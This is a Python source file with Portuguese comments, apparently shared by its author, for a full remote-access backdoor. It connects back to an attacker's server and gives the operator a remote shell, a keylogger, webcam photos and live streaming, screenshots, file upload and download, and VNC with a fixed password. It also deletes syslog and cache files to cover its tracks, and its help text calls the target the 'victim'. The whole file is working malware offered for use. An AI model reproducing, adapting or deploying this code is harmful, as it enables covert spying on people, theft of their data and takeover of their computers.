#!/usr/bin/python3

#Author: Shinigami

try:
    from PIL import ImageGrab
except:
    pass
try:
    from flask import Flask, render_template, Response, render_template_string
except:
    pass
try:
    import cv2
except:
    pass
try:
    from pynput.keyboard import Listener
except:
    pass

import os
import subprocess
from socket import *
from os import system

banner = """
   .  ╔═══════════╗ 
    ╔═╝███████████╚═╗
   ╔╝███████████████╚╗ 
   ║█████████████████║ 
   ║█████████████████║ 
   ║█████████████████║
   ║█╔█████████████╗█║ 
   ╚╦╝███▒▒███▒▒███╚╦╝ 
   ╔╝██▒▒▒▒███▒▒▒▒██╚╗ 
   ║██▒▒▒▒▒███▒▒▒▒▒██║ 
   ║██▒▒▒▒█████▒▒▒▒██║ 
   ╚╗███████████████╔╝
  ╔═╬══╦╝██▒█▒██╚╦══╝.▒.. 
  ║█║══║█████████║　...▒.  
  ║█║══║█║██║██║█║　.▒..
  ║█║══╚═╩══╩╦═╩═╩═╦╗▒.  
 ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
╔╝█████║█║██║██║█║
║██████║█████████║
"""

help = """
help, ?                 mostra esse help
info                    retorna informações do alvo
vnc                     retorna conexão com interface grafica usando x11vnc (LINUX PC)
root_check               verifica se a vitima tem root
keylogger               ativa o modo de keylogger (LINUX PC)
screenshot, print       faz uma captura de tela
cam_take                tira uma foto da cam
cam_live                assista a webcam em live
download                faz o download de certo arquivo para sua maquina
upload                  faz o upload para a maquina da vitima
"""

system_op = subprocess.run("uname -o", shell=True, stdout=subprocess.PIPE)
system_op = str(system_op.stdout)

class B4CKD00R():
    def __init__(self, host="", port=""):
        self.host = host
        self.port = port

    def S0CK37(self):
        global sock
        sock = socket(AF_INET, SOCK_STREAM)
        try:
            sock.connect((self.host, self.port))
        except ConnectionRefusedError:
            pass
        except Exception as error:
            print(error)
        else:
            try:
                sock.send(banner.encode("utf-8"))
                B4CKD00R().C0MM4ND("pwd")
                while True:
                    recv = sock.recv(2048).decode()
                    if "help" in recv or "?" in recv:
                        sock.send(help.encode("utf-8"))
                    elif "nano" in recv or "nvim" in recv or "vim" in recv or "neovim" in recv or "mousepad" in recv or "spacevim" in recv:
                        sock.send("NÃO TENTE USAR EDITORES DE TEXTO ELES QUEBRAM A FERRAMENTA\n".encode("utf-8")) 
                    elif "keylogger" in recv:
                        if "Android" in system_op:
                            sock.send("[-] DISPONIVEL APENAS PARA LINUX PC".encode("utf-8"))
                        else:
                            B4CKD00R().K3YL00GU3R()
                    elif "cam_take" in recv:
                        B4CKD00R().C4M_74K3()
                    elif "cam_live" in recv:
                        B4CKD00R().C4M_L1V3()
                    elif "screenshot" in recv or "print" in recv:
                        B4CKD00R().SCR33N5H07()
                    elif "info" in recv:
                        B4CKD00R().INF0()
                    elif "root_check" in recv:
                        B4CKD00R().R007_1NF0()
                    elif "vnc" in recv:
                        B4CKD00R().VNC()
                    elif "download" in recv:
                        B4CKD00R().D0WNL04D(recv)
                    elif "upload" in recv:
                        B4CKD00R().UPL04D(recv)
                    else:
                        B4CKD00R().C0MM4ND(recv)
                    
            except BrokenPipeError:
                B4CKD00R().CL34M()
                pass

            except:
                pass

    def C0MM4ND(self, cmd=""):
        if "cd" in cmd:
            cmd = cmd.replace("cd", "").strip()
            try:
                os.chdir(cmd)
            except:
                sock.send(f"[-] DIRETORY NOT FOUND: {cmd}\n".encode("utf-8"))
            else:
                resp = subprocess.run("pwd", shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                sock.send(f"OPEN DIRECTORY: {resp.stdout.decode()}\n".encode("utf-8"))

        else:
            resp = subprocess.run(cmd, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
            if resp.stderr:
                sock.send(f"[-] COMMAND INVALID: {cmd}\n".encode("utf-8"))
            if resp.stdout:
                sock.send(resp.stdout)
            else:
                sock.send(f"[+] COMMAND OK: {cmd}\n".encode("utf-8"))

    def K3YL00GU3R(self):
        #print("keylogger")
        def keylog(key):
            keydata = str(key).replace("'", "")
            if "Key.space" in keydata:
                keydata = " "
            if "Key" in keydata:
                pass
            else:
                sock.send(keydata.encode("utf-8"))

        with Listener(on_press=keylog) as l:
            l.join()

    
    def SCR33N5H07(self):
        if "Android" in system_op:
            sock.send("[-] EM BREVE".encode("utf-8"))
        else:
            try:
                #ss_region = (300, 300, 600, 600)
                ss_image = ImageGrab.grab()
                ss_image.save("print.jpg")
                B4CKD00R().D0WNL04D("print.jpg")
                subprocess.run("rm print.jpg", shell=True, stdout=subprocess.PIPE)
            except:
                sock.send("[-] ERRO AO TIRAR PRINT".encode("utf-8"))
            #else:
                #sock.send("[+] PRINT TIRADA COM SUCESSO".encode("utf-8"))

    def INF0(self):
        #print("address")
        informations = subprocess.run("uname -a && curl http://ip-api.com/json/", shell="True", stdout=subprocess.PIPE)
        dados = str(informations.stdout.decode())
        dados = dados.replace(",", "\n").replace("\"", "").replace("{", "").replace("}", "")
        sock.send(f"{dados}\n".encode("utf-8"))

    def R007_1NF0(self):
        try:
            resp = subprocess.run("id", shell=True, stdout=subprocess.PIPE)
            if "root" in str(resp.stdout):
                sock.send("[+] JÁ ESTA COM USUARIO ROOT\n".encode("utf-8"))
            else:
                resp = subprocess.run("su --help", shell=True, stdout=subprocess.PIPE)
                if "version" in str(resp.stdout) or "versão" in str(resp.stdout):
                    sock.send("[+] O USUARIO POSSUI ROOT\n".encode("utf-8"))
                else:
                    sock.send("[-] O USUARIO NÃO POSSUI ROOT\n".encode("utf-8"))
        except:
            sock.send("[-] NÃO FOI POSSIVEL VERIVICAR\n".encode("utf-8"))

    def C4M_74K3(self):
        print("cam take")
        cam_port = 0 
        cam = cv2.VideoCapture(cam_port)
        result, image = cam.read()
        if result:
            cv2.imwrite("cam_take.jpg", image)
            B4CKD00R().D0WNL04D("cam_take.jpg")      
            subprocess.run("rm cam_take.jpg", stdout=subprocess.PIPE, shell=True)      
        #print("captured hehehe")

    def C4M_L1V3(self):
        sock.send("cam live em http://<IP_VITIMA>:5000\n".encode("utf-8"))
        app = Flask(__name__)
        cap = cv2.VideoCapture(0)

        def generate():
            if cap.isOpened():
                #print("conected")
                tot = 0
                while True:
                    val, frame = cap.read()
                    #cv2.imshow("VIDEO", frame)
                    key = cv2.waitKey(3) 
                    tot += 1
                    
                    flag, encodedImage = cv2.imencode(".jpg", frame)
                    if not flag:
                        continue
                    yield(b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + bytearray(encodedImage) + b'\r\n')
                    if tot >= 5000:
                        break
                        return

        @app.route("/")
        def index():
            #return render_template("index.html")
            return render_template_string('''<!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>live webcam</title>
            <!-- CSS only -->
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
            <style>
                body {
                    background-color: black;
                    color: green;
                    text-align: center;
                }

                img {
                    margin: auto;
                    justify-content: center;
                    display: block;
                    border: 1px solid green;
                    width: 600px;
                }

                footer {
                    position: absolute;
                    bottom: 0;
                    right: 0;
                }

                footer p {
                    font-size: 10px;
                    padding: 1rem;
                    color: green;
                }

                footer a {
                    text-decoration: none;
                }

                footer p:hover {
                    color: red;
                }

                @media (max-width: 600px) {
                    img {
                        width: 100%;
                    }
                }
            </style>
        </head>
        <body>
            <main>
                <div class="container">
                    <h1>Webcam Live</h1>
                    <img id="bg" src="{{ url_for('video_feed') }}" alt="cam">
                </div>
            </main>
            <footer>
                <a href="https://www.facebook.com/profile.php?id=100080730216339" target="_blank"><p>SH1N1G4M1</p></a>
            </footer>
        </body>
        </html>''')

        @app.route("/video")
        def video_feed():
            return Response(generate(), 
            mimetype="multipart/x-mixed-replace; boundary=frame")

        if __name__ == "__main__":
            app.run(debug=False)

        cap.release()
    
    def VNC(self):
        if "Android" in system_op:
            sock.send("[-] NÃO É POSSIVEL PEGAR VNC NO ANDROID\n".encode("utf-8"))
        else:
            resp = subprocess.run("id", shell=True, stdout=subprocess.PIPE)
            sock.send("[+] VNC - TENTE CONECTAR NA PORTA: 4900, SENHA: trouxa".encode("utf-8"))
            if "root" in str(resp.stdout):
                resp = subprocess.run("x11vnc -storepasswd trouxa /root/.vncpasswd && x11vnc", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                print(resp.stdout.decode())
                if "not found" in str(resp.stdout.decode()) or "não encontrado" in str(resp.stdout.decode()):
                    #sock.send("[-] X11VNC NÃO INSTALADO, TENTANDO INSTALAR".encode("utf-8"))
                    resp = subprocess.run("apt install x11vnc -y", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    sock.send("[+] X11VNC INSTALADO RODE O COMANDO NOVAMENTE".encode("utf-8"))
                #else:
                    #ock.send("[+] VNC RODANDO NA PORTA: 4900, SENHA: trouxa".encode("utf-8"))
            else:
                resp = subprocess.run("x11vnc -storepasswd trouxa /$HOME/.vncpasswd && x11vnc", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                if "not found" in str(resp.stdout.decode()) or "não encontrado" in str(resp.stdout.decode()):
                    sock.send("[-] X11VNC NÃO INSTALADO TENTE INSTALAR COM SUPER USUARIO".encode("utf-8"))
                #else:
                    #sock.send("[+] VNC RODANDO NA PORTA: 4900, SENHA: trouxa".encode("utf-8"))

    def CL34M(self):
        try:
            system("rm -rf ~/.cache")
            system("rm -rf /var/log/syslog")
        except:
            pass
        #print("LIMPO\n")

    def UPL04D(self, cmd):
        #print("upload")
        if "upload" in cmd:
            cmd = cmd.replace("upload", "").strip()
        filesize = int(sock.recv(4096).decode())
        with open(cmd, "wb") as f:
            total_bytes = 0
            while True:
                bytes = sock.recv(4096)
                #progress.update(len(bytes))
                f.write(bytes)
                total_bytes += len(bytes)
                if total_bytes >= filesize:
                    break
        sock.send("[+] UPLOAD COMPLETO\n".encode("utf-8"))

    def D0WNL04D(self, cmd):
        if "download" in cmd:
            cmd = cmd.replace("download", "").strip()
        filesize = os.path.getsize(cmd)
        print(filesize)
        sock.send(f"{filesize}".encode("utf-8"))

        with open(cmd, "rb") as f:
            while True:
                bytes = f.read(1024 * 4)
                if not bytes:
                    break
                sock.sendall(bytes)
        """
        print("download")
        cmd = cmd.replace("download", "").strip()
        try:
            try:
                file = open(cmd, "r")
            except:
                sock.send("[-] ARQUIVO NÃO ENCONTRADO".encode("utf-8"))
            file.close()
            file = open(cmd, "rb")
            filesize = os.path.getsize(file)
            print(f"tam: {filesize}")
            for data in file.readlines():
                sock.send(data)
        except:
            sock.send("[-] ERRO AO BAIXAR ARQUIVO".encode("utf-8"))
        """

lhost = "--LHOST--" #COLOQUE A VPS AQUI
lport = "--LPORT--" #PORTA DA VPS

if __name__ == "__main__":
    while True:
        B4CKD00R(lhost, lport).S0CK37()
